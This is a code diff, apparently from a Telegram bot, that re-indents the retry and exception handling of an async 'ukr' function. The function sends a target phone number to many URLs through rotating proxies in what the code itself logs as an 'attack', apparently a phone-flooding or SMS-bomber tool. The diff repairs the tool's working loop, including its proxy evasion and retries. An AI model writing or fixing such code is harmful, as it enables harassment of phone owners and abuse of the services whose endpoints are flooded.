@@ -1367,9 +1367,9 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
         use_custom_session = req_cookies is not None
         
         for attempt in range(MAX_RETRIES + 1):
-        try:
-            if not attack_flags.get(chat_id):
-                return
+            try:
+                if not attack_flags.get(chat_id):
+                    return
                 
                 # При retry пробуємо випадковий новий проксі (якщо є)
                 if attempt > 0 and shuffled_proxies and USE_PROXIES:
@@ -1409,12 +1409,12 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
                                 logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                 return True
                     else:
-                async with session.post(url, **kwargs) as response:
-                    if response.status == 200:
+                        async with session.post(url, **kwargs) as response:
+                            if response.status == 200:
                                 logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                 return True
                 return False
-        except asyncio.TimeoutError:
+            except asyncio.TimeoutError:
                 # Таймаути вимкнені, але залишаємо обробку на випадок інших помилок
                 if attempt < MAX_RETRIES:
                     logging.debug(f"[ATTACK] Retry {attempt+1} for {url}")
@@ -1429,17 +1429,17 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
                     else:
                         _proxy_circuit_breaker[original_proxy] = (1, now)
                 return False
-        except aiohttp.ClientError as e:
+            except aiohttp.ClientError as e:
                 if attempt < MAX_RETRIES:
                     logging.debug(f"[ATTACK] ClientError retry {attempt+1} for {url}: {e}")
                     await asyncio.sleep(0.2 * (attempt + 1))
                     continue
                 logging.debug(f"[ATTACK] ClientError after {MAX_RETRIES+1} attempts: {url} - {e}")
                 return False
-        except Exception as e:
+            except Exception as e:
                 logging.debug(f"[ATTACK] Exception for {url}: {e}")
                 return False
-
+        
         return False
 
     # Semaphore для контролю паралелізму (зменшено для плавної роботи)
